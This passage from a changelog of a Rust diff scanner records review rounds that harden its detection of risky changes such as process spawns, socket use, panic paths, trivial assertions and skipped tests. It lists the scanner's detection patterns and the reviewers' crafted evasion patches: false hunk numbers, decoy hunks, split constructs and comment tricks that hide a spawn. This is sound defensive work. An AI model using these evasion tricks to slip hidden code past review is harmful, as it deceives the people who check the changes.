    that began two or more block comments deep is read as one deep (this entry said that
    this "shows code earlier than the compiler does and never later"; that was false, as
    the next entry says: the text shown too early can hide later code).
    The false items of the two further
    readings, counted above. Editions before 2021: `cr"…"` is there the name `cr` and an
    ordinary string, and `'r#name` is `'r`, `#` and what follows, so `cr"\"` and `'r#r"\"`
    end a string elsewhere than the view does and a text written for those editions can
    hide what follows (`c"…"` blanks the same bytes either way; `k#…` is read as those
    editions read it). Frontmatter, which the compiler refuses as experimental. Characters
    assigned after Unicode 18.0.0. A side whose first line says it is line 1 was taken for
    the top of its file. (This entry said that this is where `git apply` puts such a hunk
    unless it is run with `--unidiff-zero` or `-C0`. That was wrong: Git puts a hunk where
    its old lines are, looking first at its new position, and only an old position of 0 or
    1 says it must be the beginning. The next two entries correct it: the top of a file is
    decided by what Git must do, and the sentence that stood here for a day, that Git places
    a hunk by its old position and never by the new one, had the two numbers the wrong way
    round.)
  - *Tests.* Unit tests hold each start of a view, the shebang rule in twenty-four forms
    (each checked with rustc 1.99.1), `k#`, the white space, and the eleven scanner rules
    that the review's mutation run found no test for (IR5-L-1; one of the eleven, a rule
    for `c"`, did nothing a name and a string do not do, and is gone); every reproduction of
    both reviews is an assertion in the tests or the corpus. The fuzz target
    `rust_code_view` now holds the exact view on every line (precision was not checked
    after a string over a line end, which is where IR5-H-1 lived), and holds the other
    starts to it: read from inside a comment a text has the views of `/*` and the text,
    from inside a string those of `"` and the text, and from line 1 a shebang line by the
    compiler's own rule is blank. `rust_tokens` has a fifth rule: constructs the target
    writes itself give the same signals with a block comment of any text between two of
    their tokens and complete strings of any text on the lines before them. The corpus has
    48 cases (new: `evidence/independent-review-5-20261114`, nineteen items, two declared
    false positives and four declared misses): evidence precision 116 of 132 (was 97 of
    111), recall 116 of 162 (was 97 of 139), 65 declared (was 59). The head of
    `rust_tokens.rs` no longer says the view ends a block comment at the first `*/`
    (VD3R12-L-1, IR5-L-2), and the comment on `Found` names both kinds of item that can
    come late (IR5-L-3).

- **Round 17 of Vesper's review (NO-GO on one medium) and a tenth independent review
  (GO-WITH-FIXES, nothing high): no form is read at the end of a hunk side.** Both
  reviews read the round 17 commit (`aa4acb7`). The tenth found it never lower than
  release 0.8.3 or round 14 on every set it made (40,000 real `git diff --no-index`
  patches, 46,000 generated, the `-U0`/`-U1`/`-U3` history of two repositories) beside
  the declared `ignore`, and no edge item on 19.1 million lines of real Rust as one-line
  hunks. Each broke the last edge form all the same.
  - *No form is read at the end of a side (VD3R17-M-1, IR10-L-3; the coordinator's
    ruling).* Round 17 kept one form, a method's name with `::` after it (`.unwrap::`,
    `.expect::`, also with the `<`), because outside a macro only generic arguments and
    the call can follow. Vesper compiled `macro_rules! discard { ($($tokens:tt)*) => {}; }`
    and `discard! { value.unwrap:: NOT_A_CALL }`: it runs and calls nothing, and the
    `git diff -U0` of a change from `value.other::` ends its hunk on `value.unwrap::`,
    which round 17 reported as a `panic_path_added`. The tenth reviewer wrote
    `let r = 1..unwrap::` and `<u8>();` with a free function named `unwrap`: after a range
    the `.` is the second of `..`. Rounds 15, 16 and 17 each kept forms read at the end of
    a side and each was broken by grammar (a path, an assertion, a sentence, a macro, a
    range). **The rule now, in one sentence: a hunk side is read as text that ends there;
    nothing is inferred from how it ends.** `waiting` and the `end` flag of the reader are
    gone. A construct cut by two hunks is found by a join (one true number of the second
    hunk, the old or the new) or where one half holds it whole; behind two false numbers
    it is a declared miss that takes a writer. Of the 265 cuts of 28 constructs written as
    two hunks, all are found with one true number, and 176 with none (round 17: 178; the
    two are the cuts after `.unwrap ::` and `.unwrap :: <`). The ninth review's
    `turbo.rs` in the corpus is a declared miss now. Tests: a property test over every
    form that rounds 13 to 17 read at an edge (52, listed in `rust_tokens`'s tests: the
    `cfg_attr` list left open on `ignore`; round 15's bare names, `X::unwrap`, `todo`,
    `assert`, `assert_eq!(true,`, `Command`, `TcpStream`, `UdpSocket`, `reqwest`, `ureq`;
    rounds 15 and 16's `todo!`, `assert!(true`, `assert_eq!(true, true`, `#[ignore`,
    `#[allow`, `Command::`, `process::`, `TcpStream::`, `UdpSocket::` and the old side's
    `#[test`, `#[rstest`, `#[tokio`, `#[tokio::`, `#[tokio::test`; round 17's `.unwrap::`,
    `.unwrap::<`, `.expect::`, `.expect::<`; the reviewers' `value.unwrap::` and
    `0..unwrap::`), each at the end of a new side and of an old side, after context and
    after a changed line, spaced and a token a line, in a macro's braces and not: no
    item; the method call with generic arguments read by the rule for the whole over any
    lines (336 continuations) and not before its call; Vesper's `macro-token-tree.patch`
    and the review's `range-u0.patch` at no signal in the graph crate's tests and as hard
    negatives in the corpus. The whole rule still reads `0..unwrap::<u8>()` as a method
    call when the side shows the call (round 14 did too; rustfmt writes it on one line):
    a writer's false positive, not changed here.
  - *The bare `ignore` at the end of a side (the ruling of round 17, kept; its statement
    corrected).* A `cfg_attr` list that a side leaves open on `ignore` is still not a
    skip (it can go on as `ignore::case`). Round 17 framed this as three of its own
    patches; the tenth review showed it is **ordinary**: rustfmt writes a long condition
    over lines and `ignore` alone on the line above `)]`, so a `git diff -U0` of two
    rustfmt-clean files ends there (`cfgu0.patch`; rounds 14 and 16 reported the skip,
    round 17 and release 0.8.3 do not). The README, the head of `rust_tokens` and the
    corpus (`tests/slow.rs`, a declared miss) say so.
  - *`#[ignore(…)]` is a skip (IR10-M-1).* The round 17 entry below says "`#[ignore(…)]`
    is refused by the compiler and is not a form of the attribute", and the doc comment of
    `waiting` said the same. **That is false:** rustc 1.99.1 reports `#[ignore(reason)]`
    through the lint `ill_formed_attribute_input` ("this was previously accepted by the
    compiler"), deny by default, and a lint can be allowed (`[lints.rust]
    ill_formed_attribute_input = "allow"` in `Cargo.toml`, a line no Rust rule reads);
    then the test compiles and does not run (checked again here: `#[ignore(not_ready)]`,
    `#[ignore()]`, `#[cfg_attr(all(), ignore(x))]`, `#![ignore(x)]` inside a test's body
    and `cfg_attr` within `cfg_attr`, each `ignored`). `#[ignore(`, `#![ignore(` and
    `ignore(` as an attribute of its own in a `cfg_attr` list are read as `test_skipped`
    on the whole text, at any spacing the reader handles (never at an edge). No version
    read them; release 0.8.3 neither. `#[ignore[x]]` is a hard error and is not read.
  - *A created file in several hunks at old position 0 (IR10-L-1; declared).* Plain
    `git apply` refuses a created file with a second hunk at `-0,0`; `git apply
    --unidiff-zero` applies it and puts the later hunk at line 1, above the earlier, as for
    an existing file, while the reader joins a created file's hunks in the order written.
    So `newtwotop.patch` (the call in Git's result) is a declared miss and
    `newtop-natural.patch` (no call in Git's result; rounds 14 to 17 report one) a declared
    false positive, both writers'. Declared with IR9-M-1 in the README, the docs of
    `placed_at_top` (whose "and no other" was false for this applier) and `joined_texts`,
    a test and the corpus. No new join family.
  - *Bracketed released paths after a keyword (IR10-L-2).* `<Command>::new(…)` and the
    other bracketed spellings are read where the `<` follows a keyword after which an
    expression begins: `return`, `match`, `in` (of `for … in`), `break` with or without
    its label (`break 'l <Command>::new(…)`), `yield`, `if`, `while` (compiled and run
    here: each spawns). Not after `else` (only `{` or `if` can follow it), not after any
    other name (`a <Command> ::new(x)`, `x.await <…`, a label alone). The review's
    `kw.patch` has five `process_spawn` items, the four keywords and the control after `=`
    (round 17: the control only); `kw-u3.patch` and `kw-u0.patch` score 6 (every version
    before: 2). The whole rule reads `0..unwrap::<u8>()` as a method call (above).
  - *Documents (IR10-L-4).* The head of `rust_tokens` (its list of declared limits), the
    head of `evidence`, `docs/TESTING_GOLD_STANDARD.md`, the README and the docs of
    `read_new`, `read_old`, `Skips`, `placed_at_top` and `joined_texts` say the one rule;
    the sentences that named an edge form as read are gone or marked as history. The
    memory test is described as what it is: it counts the lines of the views a reading
    holds, not memory (the README's memory figures are measured, not held by it).
  - *Fuzz.* `rust_hunk_places` (43 seeds; 5 new, printable ASCII): rule 7 is turned round
    (a method call with generic arguments cut after its `::` or `<` is not found when the
    numbers say nothing,
    and is found by the join when the old number is true); rule 9 has the reviewers'
    shapes (`value.unwrap::`, `value.expect::<` in a macro's braces, `0..unwrap::`); new
    rule 16: a side's last line, whole and cut between two tokens outside every string
    and comment of every reading (every cut of a line from a list of every form some
    round read at an edge written out whole, and one cut of the input's own first line),
    and the cut line reports nothing of the reader's eight signals that the whole line
    does not; the joined constructs have `ignore(…)` in a `cfg_attr` list. `rust_tokens`
    has `#[ignore(…)]` and a `cfg_attr` `ignore(…)` among its constructs (one new seed).
    No existing seed's bytes changed; the new seeds are printable ASCII.
  - *Controls, comparisons, cost.* Each plant in a scratch clone with its own target
    directory, against the graph crate's 239 tests (all pass unplanted; so do the corpus
    test's 9): round 17's `.unwrap::` read at the end of a side again fails 4
    (`no_form_is_read_at_the_end_of_a_side`, the method call over any lines, and the two
    counts of cuts); round 16's `todo!` there 5; the bare `ignore` of a `cfg_attr` list left
    open read as a skip again (rounds 13 to 16) 6; `#[ignore(` unread 2, and 4 of the corpus
    test; `ignore(` in a `cfg_attr` list unread 2; no keyword before a bracketed path 1, any
    name before it 2, the label of `break 'l` unread 1, `else` and `await` taken for such
    keywords 1; a created file's later hunk at `-0,0` read as a top 2; the four changes of
    the reader undone at once (the reading of `aa4acb7`) 8, and 4 of the corpus test. The
    fuzz target `rust_hunk_places` built as a plain program and run over its 43 seeds, each
    rule alone: with this round's reader no rule fails; with `aa4acb7`'s, rule 7 fails on
    all 43, rule 16 on 5, rule 9 on 2 (the macro and the range) and rules 6, 10 and 15 on
    3 (`ignore(…)` in a `cfg_attr` list); with the `.unwrap::` plant, rules 7, 16 and 9 as
    for `aa4acb7` and no other. (That run found one of this round's joined constructs
    written with its `ignore` on the line that rules 10 and 15 show as context, which is no
    change to a skip; it is cut before its `ignore` now, as the bare one is.) On the final
    binary, 6,059 patches (the 6,000 the rounds are measured on, round 17's own 33, the
    tenth review's 12 reproductions, Vesper's, and this round's 13), score, signals and
    items, plain and strict: against release 0.8.3 one patch lower, the second section for
    one path (as before), and 2,518 with something gained; against round 14, six lower,
    every one the bare `ignore` above (round 17's own `e5` and `skipend`, the ninth review's
    case, `cfgu0.patch` and two copies of it, this round's own and the tenth review's case
    in the corpus; strict adds the list of 32 of `bound-lang.patch`, as in rounds 16 and
    17); against round 17, twelve lower, every one a `.unwrap::` or `.expect::` at the end
    of a side (the eighth review's cuts `c03-cut07` and `c03-cut08`, the ninth review's
    `turbo.rs`, the tenth review's `range-edge` and `range-u0` and its case in the corpus,
    Vesper's `macro-token-tree`, and five of this round's own), and eleven with something
    gained (`#[ignore(…)]`, the keywords). No refusal differs. Cost, the 51 inputs of round
    16 (`--rank --json`, user and system seconds, the best of three, peak memory, one
    process at a time, against round 17): 48.13 s in all for round 17 and 48.53 s now,
    peak memory within 1 MiB on every input; one input looked 22 % slower (`short-frag`,
    1.22 against 1.49 s) and three alternating runs gave 1.21 s each way; the slowest,
    `items60-frag`, 4.41 against 4.50 s, 404 MiB each. (Measured on a build whose answers
    are those of the final binary on all 6,059 patches; a second run on the final binary,
    on a loaded machine, gave 50.60 against 51.51 s, peak memory within 2 MiB, and the best
    of three alternating runs of its two slowest-looking inputs equal: `items60-frag` 4.45
    against 4.41 s, `dquote-newfile-lines` 1.04 against 1.03 s.) Memory on the reviewer's
    shapes (`--rank`): within 0.4 % of round 17 on every shape (43,000 touching hunks 280
    MB; with 60-byte context lines 451 MB; 200,000 chained hunks 193 MB); within 1.6 % (at
    most 1.3 MB) in the second run.
- **Round 16 of Vesper's review (NO-GO on one medium) and a ninth independent review
  (GO-WITH-FIXES, nothing high): the end of a hunk side is read under one rule, and what
  the joins do not see is declared.** Both reviews read the round 16 commit (`4391c1e`) and
  found it never lower than release 0.8.3 or round 14 (the independent reviewer on about
  130,000 patches of its own making), its joins the joins of round 14 where they should be,
  its time linear. Each broke the claim that what a side ends on is read only where no
  honest line ends so.
  - *An edge form is read only where every continuation is the construct (VD3R16-M-1,
    IR9-M-2, IR9-L-5).* Vesper compiled `const X: u8 = Command::` with `VERSION;` on the
    next line; the `git diff -U0` of a change from `Other::` ends its hunk on `Command::`,
    and round 16 reported a `process_spawn` in a file that spawns nothing. The independent
    reviewer had rustfmt write `assert!(`, `true` and `&& "…".len() > limit` on three lines
    (an assertion that can fail); a `-U0` hunk that changes the first two ends on
    `assert!(true` and was a `trivial_assert`. And a line of a block comment that ends on
    `todo!`, read from code because the hunk does not show the comment's opener, was a
    `stub_added`. Rounds 15 and 16 argued "no honest line ends so" from 8.1 million lines;
    a sample cannot show it, and twice it was false by grammar. **The rule now:** a form at
    the end of a side is read only where the reader's own rule for the whole construct
    fires on the tokens shown followed by ANY continuation the grammar allows, and where it
    is not a plausible end of a sentence; a form whose next token decides whether it is
    the construct is not read. One form is left: a method's name with `::` after it
    (`.unwrap::`, `.expect::`, also with the `<`), after which only generic arguments and
    the call's bracket can follow (a field has no generic arguments: the compiler refuses
    `s.unwrap::<u8>` with no call). Everything else rounds 15 and 16 read there is gone:
    `Command::`, `process::`, `TcpStream::`, `UdpSocket::` (a path names anything its
    owner holds: `Command::VERSION`, `process::id()`); `assert!(true` and
    `assert_eq!(true, true` (`&& x`, `== f()` can follow; with the comma after the `true`
    the condition is over and `trivial_assert` reads it anywhere, so no form at an edge is
    needed); `#[ignore` and `#[allow` and their `#![` forms (`#[ignore::case]` is an
    attribute of a crate or module of that name; `#[ignore =` and `#[allow(` are read
    anywhere; `#[ignore(…)]` is refused by the compiler and is not a form of the
    attribute); `todo!` and `unimplemented!` (by grammar only a bracket follows, but a
    sentence ends so, IR9-L-5; with the bracket `stub` reads it anywhere); and on the old
    side `#[test`, `#[rstest`, `#[tokio`, `#[tokio::`, `#[tokio::test` (`#[rstest::fixture]`,
    `#[tokio::main]`), so nothing is read at the end of an old side. The same rule removed
    one older reading, by the coordinator's ruling: from round 13 to round 16 a `cfg_attr`
    list that a side left open on `ignore` was taken to hold the skip (`Skips::end`);
    `#[cfg_attr(miri, ignore::case)]` is no skip, so the bare `ignore` at a side's end is
    not read any more (with `,`, `)` or `=` after it, it is). **This is the one place where
    this round reports less than round 14** (release 0.8.3 reports nothing there): of the
    6,035 patches compared below, three of this round's own making show it and none of the
    6,002 of the list the rounds are measured on. Of the 265 cuts of 28 constructs into two
    hunks behind two false numbers, 178 are found (round 16: 201): the cuts that leave a
    construct whole in one half and the two after `.unwrap ::` and `.unwrap :: <`; with one
    true number all 265 are, as before. Tests: the form that stays, with a generated set of
    336 continuations (4 shown forms, 7 shapes of generic arguments, 4 calls, on one line
    and on two), each read as one text by the rule for the whole; every form that went,
    with its honest continuation, at "no signal" at the end of a side and as one text; the
    reviewers' patches (`command-colon.patch`, `asserttrue-u0.patch`, `prose.patch`) at no
    signal; the cuts as declared misses in the corpus and in the README's limits.
  - *Hunks at old position 0 (IR9-M-1; declared).* `git apply --unidiff-zero` puts every
    hunk at old position 0 at line 1, the one written later above the one written earlier,
    and a hunk at old position 1 under them (Git 2.56.0: `twotop.patch` "Hunk #1 succeeded
    at 1 (offset -2 lines)"; `topone.patch`, every number true, "Applied patch m.rs
    cleanly"; plain `git apply` refuses both). Each such hunk is the top of its file to the
    reader and is joined to nothing, so `opt.unwrap` in one and `()` in the next are not
    read as a call. Declared, as the hunk an applier puts inside another was (one more
    family of joins has cost a round each time): a sentence in the README's list of what
    needs a writer, `twotop` and `topone` as declared misses in the corpus, and a test that
    pins both with a control (`@@ -1,0 …` under the first, which is no top, is read
    together). The README sentence "`--unidiff-zero` puts a hunk with no old line at its
    new position" was false for old position 0 and says so now. The reviewer's suspicion,
    built: a `-0,0` hunk that ends on `/*` and a `-1,1` hunk whose added line is
    `// */ pub fn f() { … spawn … } /*` (`topcomment.patch`): `git apply --unidiff-zero`
    applies it cleanly, rustc compiles the result and it holds the spawn; release 0.8.3,
    round 14, round 16 and this round all score it 2. Declared with the same entry.
  - *The released paths with a qualified name in angle brackets (VD3R16-L-1, IR9-L-2).*
    `<std::net::TcpStream>::connect`, `<std::net::UdpSocket>::bind`, `<self::UdpSocket>::bind`
    and `<p::Command>::new` (after `use std::process as p`) are read: the name in the
    brackets may be the last name of a path, and the names before it (eight at most) are
    passed over backwards in the tokens the reader already holds, with no new scan.
    Vesper's `q.patch` scores 9 (round 16: 6, the spawn only); of the reviewer's seven
    spellings three are read and four are declared and not read: in parentheses
    (`<(Command)>::new`, `<(TcpStream)>::connect`), with an empty list of generic arguments
    inside the brackets (`<Command<>>::new`), and as an associated type
    (`<<Command as T>::Me>::new`).
  - *Memory, stated as it is and held by a count (IR9-L-3, IR9-L-6).* Beside the patch a
    scan holds one reading of one text at a time (a copy of each line for each side it is
    on), so at most one reading of the longest text of a file, and that is the whole file
    when its hunks touch. Each reading now counts its lines while it is alive, and a test
    holds that the most alive at one time is one reading of the longest text (200 hunks
    apart: 21 lines; the same touching: all 4,200 once; a hunk in six texts: 8);
    `evidence_scan` holds that it is never more than the file's lines. `--rank`, peak
    resident memory, release 0.8.3 | round 16 | now, on the reviewer's shapes:

    | `--rank` of one file | release 0.8.3 | round 16 | now |
    | --- | ---: | ---: | ---: |
    | 43,000 touching hunks of 21 short lines | 106 MB | 279 MB | 280 MB (2.65 times) |
    | the same with context lines of 60 bytes (54 MB of patch) | 197 MB | 450 MB | 451 MB (2.29 times) |
    | 20,000 touching hunks of 41 empty lines | 69 MB | 175 MB | 176 MB (2.56 times) |
    | the same 20,000 hunks apart | 68 MB | 71 MB | 72 MB (1.06 times) |
    | 200,000 hunks whose numbers chain forward and backward | 89 MB | 193 MB | 194 MB (2.19 times) |
    | 20,000 and 40,000 touching hunks of 21 lines | 51, 98 MB | 132, 260 MB | 133, 261 MB |

    It is linear; the factor the request for round 16 stated (up to 2.0) was measured on
    other shapes. The README states these shapes and factors.
  - *Declared and stated (IR9-L-1, IR9-L-4, IR9-L-5).* A hunk of added lines is read as
    going on from the last hunk before it that ends its file (where plain `git apply` puts
    it), and in a `git diff -U0` the two can stand far apart: `assert!(` changed on line
    10 and `true,` added on line 41 is a `trivial_assert`, and a changed `} catch (e) {`
    with an added hunk far below that begins with `}` an `error_swallowed`. The README
    names that cost (with the reviewer's figure: on the `-U0` history of two repositories,
    10,333 Rust hunks, the joins add no label and take none), and the corpus has both as
    declared false positives. The mirror of the declared decoy (a third hunk with lines
    that says falsely that it BEGINS where two hunks touch, written between them) is named
    beside it in the README, in the corpus (`mirror.rs`) and in a test with two controls
    (its true numbers; written after both: found). The changelog's round 14 entry no longer
    lets its fuzz rule 7 stand unmarked, the test comment says seven texts, not three.
  - *Tests (IR9-L-6).* `rust_hunk_places` (38 seeds; 12 new, 2 renamed away with the forms
    they cut at): rule 7 cuts only after `.unwrap::` and `.expect::<`; rule 9 adds the
    honest ends of round 16's forms, honest forms over two lines (`assert!(` and `true`) and
    removed lines (`#[rstest`); rule 11 is a removed attribute cut in two and joined by its
    old numbers; rule 13 is the reviewer's `whole.py`: a change cut inside into touching
    hunks with the numbers Git writes loses no item of the same change as one hunk; rule 14
    is two hunks at old position 0 (declared: each keeps what it gives alone, and nothing
    the release reports is lost); rule 15 is a hunk with lines that falsely claims the place
    where two touch, written after both: it parts nothing. Each rule alone, the fuzz target
    built as a plain program and run over the 38 seeds: on this round's code no rule fails a
    seed; on round 16 rule 9 fails all 38. Planted: no joins on the hint of a number fails
    rules 6, 10, 11 and 15 on all 38 seeds and rules 13, 14 and the rest on one; nothing
    read at the end of a side, rule 7 on 35; `assert!(true` read at an edge again, rule 9 on
    30; `Command::` and `process::`, rule 9 on 5; `todo!`, rule 9 on 1; the `cfg_attr` list
    left open on `ignore` a skip again, rule 9 on 1; the last hunk of the patch taken among
    those that end before a line, rule 15 on 11; a later hunk that is a top not read on its
    own, rule 8 on 4 and rule 14 on 1. A top joined to the hunk before it by its numbers
    fails no rule; two unit tests catch it (below). Planted in a scratch clone (`git clone
    --no-local` and the round's changes, its own target), each of these fails the graph
    crate's tests named: `Command::` and `process::` read at an edge again (3 tests, among
    them `what_a_side_ends_on_with_another_continuation_is_no_item`); `assert!(true` (4);
    `todo!` (3); nothing at all read at an edge, `.unwrap::` neither (4, among them
    `every_continuation_of_a_form_read_at_an_edge_is_the_construct`); the `cfg_attr` list
    left open on `ignore` a skip again (4, among them
    `a_conditional_skip_applies_ignore_as_an_attribute_of_its_own`); the name alone in the
    angle brackets, as in round 16, and any token before the name passed over (each
    `the_released_paths_are_read_in_two_more_spellings`); the reading from code kept alive
    while the further readings are made (`a_scan_holds_one_reading_of_one_text_at_a_time`);
    a top joined by its numbers like any hunk
    (`every_join_of_round_14_is_a_text_whatever_else_the_numbers_say`,
    `what_the_joins_do_not_see_is_what_the_documents_declare`); a later top not read on its
    own (`false_numbers_take_nothing_away_from_a_script`,
    `no_header_number_hides_the_language_of_a_script`); the last hunk of the patch taken
    (`a_later_hint_takes_no_earlier_join_away` and the round 14 join test); no joins on a
    hint (11 tests). Unplanted, all 237 pass.
  - *Corpus and comparisons.* 52 cases (new: `evidence/independent-review-9-20261115`, five
    expected items, nine declared misses, two declared false positives, six hard negatives;
    the seventh review's stub cut after `todo!` and spawn cut after `Command::` are declared
    misses now): evidence precision 166 of 188 (was 163 of 183), recall 166 of 244 (was 163
    of 230), 103 declared (was 90). On the final binary, 6,035 patches (the 6,002 the rounds
    are measured on and this round's own), score, signals and items, plain and strict:
    against release 0.8.3 one patch lower, the second section for one path (as in round 16),
    2,507 with something gained; against round 14, nothing of the 6,002 lower, and three of
    this round's own patches with the `ignore` above (strict: also the list of 32, as in
    round 16); against round 16, 31 patches report less, every one an end form this entry
    takes away, and 3 report more (the qualified spellings). Cost, the 51 inputs of round 16
    (`--rank --json`, user and system seconds, the best of three, and peak memory, one
    process at a time): as round 16 within the noise, 48.29 s in all for each, every input
    within 3 % in time (those over 0.2 s) and in memory; the slowest, `items60-frag` (61
    MB), 4.42 s and 403 MB (round 16: 4.42 s, 404 MB).

- **An eighth independent review (GO-WITH-FIXES, nothing high): a hint of a later round takes
  no join away that an earlier rule made; a view of hunks by path costs what it shows; what
  is read at the end of a side, and what needs a true number, is said exactly.** The review
  read the round 15 commit and found: never lower than release 0.8.3 (55,000 generated
  patches in six languages with honest and false numbers, and the history of two
  repositories at several context widths: score, signals, items, outline labels and
  refusals, 0 lower), the language rule sound, rank and outline linear, the corpus saying
  what the binary does. It broke three claims of that commit's request, each below, and
  asked for the limits to be stated where they were not. This entry is the same round as
  the one below it (round 16): that one answers Vesper, this one the independent
  reviewer, and both stand on one commit.
  - *A hunk of added lines took the place of the hunk that truly ended there (IR8-M-1;
    lower than round 14, not lower than release 0.8.3; needs a writer who sets out to).*
    Hunks are read together on the hint of a number: the hunk that begins at a line goes
    after the hunk that says it ends before that line. Round 14 took, for a line, the first
    hunk of the patch that has old lines and ends there. Round 15 let a hunk with no line on
    the side stand for the line it names, kept ONE hunk for a line, the first of the patch,
    and went through the hunks once. So a hunk of added lines written early
    (`@@ -4,0 +60,1 @@`, one comment line) took the place of `@@ -3,2 +3,2 @@`, which ends
    on `debug_assert!(`, and `@@ -5,3 +30,3 @@`, which changes the condition to `true,`,
    was joined to the comment. Round 14 reported the assertion; round 15 did not, and did when
    the `4` was written `20`, a number plain `git apply` never reads. Five of the review's
    55,000 generated patches were lower than round 14 for this reason. A second form: a
    hunk with no old line written BEFORE the hunk it follows found itself in the table and
    gave up.
    **The rule now: a hint that a later round adds takes no join away that an earlier rule
    made.** Round 14's joins are made by round 14's rule, as it was, beside every later one
    (a test holds a copy of that rule and asks, over 40,000 generated sections of two to six
    hunks with every kind of number, that each run it makes is a text now). And the later
    hints are taken in two ways that say what they model. *As plain Git places hunks*
    (beside the joins Git must make): Git puts a hunk with no old line at the end of the
    file and not between two others, so the hunks that have lines on the side choose first
    and take a hunk with lines before one with none; a hunk with no line on a side takes no
    place on that side that a hunk with lines asks for, as the one before or as the one
    after. *By the numbers alone* (`git apply --unidiff-zero` and anything else that trusts
    them): the hunks stand in the order of their positions, a hunk with no line on the side
    between the hunk that ends before its place and the hunk that begins there, so the
    three are one text. In both, a hunk is never its own predecessor, the next hunk that is
    free is taken when the first is not, and of two hunks with no line on the side that
    name one line the one written first stands first. A hunk now stands in at most seven
    texts (six before): alone, in the run Git must make, in round 14's run, and in a run
    for each number under each of the two ways; a run that two of them make is read once.
    The review's patches: `decoy2.patch` is found again; `decoy.patch` and `triple.patch`,
    which no round found (the comment hunk written first, or between the two), are found;
    with code in the hunk of added lines that would part the assertion from its condition,
    it is found too. On the review's 55,000 generated patches, round 14 to now: 0 lower in
    score, signals, items and outline labels (9,608 with something gained).
    *What stays, and is declared:* among several hunks that all HAVE lines on a side and
    all say they end before one line, the first of the patch is taken by the first hunk
    that begins there. A third hunk with old lines and a false old number, written first,
    still parts two hunks that touch (the corpus has it as a declared miss). And against
    round 15 itself the new order is not a superset: where a hunk with no line on a side
    and a hunk with lines both name one line, round 15 joined the hunk that follows to
    whichever was written first, and now the two ways above decide. Two of the 55,000
    generated patches (hunks with random numbers, in a Python and a YAML file) report an
    item or a label less in one hunk for that; 92 report more.
  - *A view of hunks by path cost the square of the hunks for a file with no extension
    (IR8-M-2; an ordinary diff only when very large, a writer at will).* Round 15 made the
    language of a file with no extension depend on a shebang in ANY of its hunks, which is
    a pass over every hunk, and the reader of one hunk (`hunk_signals_alone`) asked for it
    again for every hunk a view showed. Rank and outline were not affected (they scan a
    file once). Now the kinds of a file are worked out once (`FileKinds::of`) and handed to
    the reader of a hunk; the views keep them beside the list of joined hunks. Wall time
    of one page (16 MiB where the row does not say), best of three runs and for the two
    rows of 50,000 hunks of five:

    | Hunks shown, one page | release 0.8.3 | round 14 | round 15 | now |
    | --- | ---: | ---: | ---: | ---: |
    | `bin/tool.sh`, 12,500 hunks | 0.21 s | 0.21 s | 0.21 s | 0.21 s |
    | `bin/tool` (no extension), 12,500 | 0.20 s | 0.20 s | 4.09 s | 0.20 s |
    | `bin/tool.sh`, 25,000 | 0.43 s | 0.44 s | 0.44 s | 0.43 s |
    | `bin/tool`, 25,000 | 0.41 s | 0.42 s | 16.08 s | 0.43 s |
    | `bin/tool.sh`, 50,000 | 0.56 s | 0.56 s | 0.58 s | 0.56 s |
    | `bin/tool`, 50,000 | 0.53 s | 0.53 s | 41.32 s | 0.54 s |
    | `data/table` in 333,000 hunks, a page of 64 KiB (175 hunks) | 0.26 s | 0.32 s | 2.70 s | 0.36 s |
    | the same, a page of 1 MiB (2,768 hunks) | 0.27 s | 0.32 s | 25.50 s | 0.31 s |

    Nothing held this cost: no test and no fuzz target called `hunk_signals_alone` (the
    views were its one caller), and the cost tests looked at rank. Now a test of the views
    counts the passes over a file (`file_walks`, a counter in the library for tests): two
    for a listing by path and for one by many addresses, for 600 hunks as for 30; a test
    of the library holds that the reader of one hunk makes none and gives what the scan of
    the file gives; and the fuzz target `evidence_scan` holds both for any text. The same
    shape was looked for elsewhere: a view of ONE joined hunk goes through the headers of
    its file a fixed number of times, which it must (to find the texts that hunk stands
    in); no other caller asks anything of a file once for each of its hunks.
  - *What the end of a side is read for, exactly (IR8-M-3).* The entry for round 15 says a
    construct "is found when the cut stands beside its word, whatever the numbers and the
    order of the hunks". That was not true when it was written (the word alone in a hunk
    of its own, cut on both sides: `let v = opt.`, `unwrap`, `();`; a function passed as a
    value, `Option::` and then `unwrap;`), and it is less true since the entry below
    narrowed the forms. Said exactly: a construct cut in two by hunks that nothing joins is
    found when one half holds a construct whole, or when the first half ends on one of the
    forms the entry below lists (`todo!`, `assert!(true`, `#[ignore`, `#[allow`,
    `Command::`, `process::`, `TcpStream::`, `UdpSocket::`, `.unwrap::`, a removed
    `#[test`), and nowhere else; a cut anywhere else needs ONE true number in the header of
    the second hunk, the old or the new, and then the join reads it. The review's
    enumeration is a test now: 28 constructs cut between any two of their tokens, 265 cuts,
    each as two hunks. With true numbers, with a false new number and with a false old
    number, all 265 are found. With both false, 201 are (round 15: 242), and the 64 others
    are the declared misses: after or before the bare word (`x.` / `unwrap()`, `x.unwrap` /
    `()`, `Command` / `::new`, `todo` / `!()`), inside an assertion before its truth,
    between `#` or `#[` and the attribute's name, inside a `cfg_attr` list, inside generic
    arguments, and the function value cut before its name.
  - *An applier that puts a hunk inside another (IR8-M-4; declared).* A hunk's lines are
    read as lines that stand together. `git apply --unidiff-zero` puts a hunk of added
    lines at its NEW number, and that can be between two lines an earlier hunk showed:
    `@@ -1,3 +1,4 @@` with `let v = opt.unwrap` as its third line and a line of context
    after it, then `@@ -3,0 +4,1 @@` with `();`. The result holds the call; plain Git puts
    the second hunk at the end of the file; no reading here puts one hunk between the lines
    of another. It is in the list of what needs a writer, and in the corpus as a declared
    miss.
  - *Two more spellings of the released paths (IR8-L-1; in release 0.8.3 too).*
    `<Command>::new("true")` and `Command::<>::new("true")` are the path `Command::new` to
    the compiler (the name alone in angle brackets; an empty list of generic arguments),
    and so for `TcpStream::connect` and `UdpSocket::bind`. All four lines of the review's
    file compile and run, and no version reported one. They are read now, as tokens.
    `Vec::<Command>::new()`, `HashMap<String, TcpStream>` and `<Command as Default>::…` are
    other paths and are not (the `<` there follows `::` or a name, or the brackets hold
    more). On every line of 603 crates as a one-line hunk (7,911,652 lines) the answer is
    item for item what it was: these spellings are in none of them.
  - *Memory, for three shapes (IR8-L-2).* The entry for round 15 gives one figure, for a
    file created as 499,000 hunks of one line, and says "now 263". It is right for that
    shape and low for others. `--rank`, peak resident memory, release 0.8.3, round 14,
    round 15, now:

    | `--rank` of one file | release 0.8.3 | round 14 | round 15 | now |
    | --- | ---: | ---: | ---: | ---: |
    | created as 499,000 hunks of one line (the figure of the entry for round 15) | 176 MB, 0.60 s | 293 MB, 1.50 s | 263 MB, 1.58 s | 262 MB, 1.54 s |
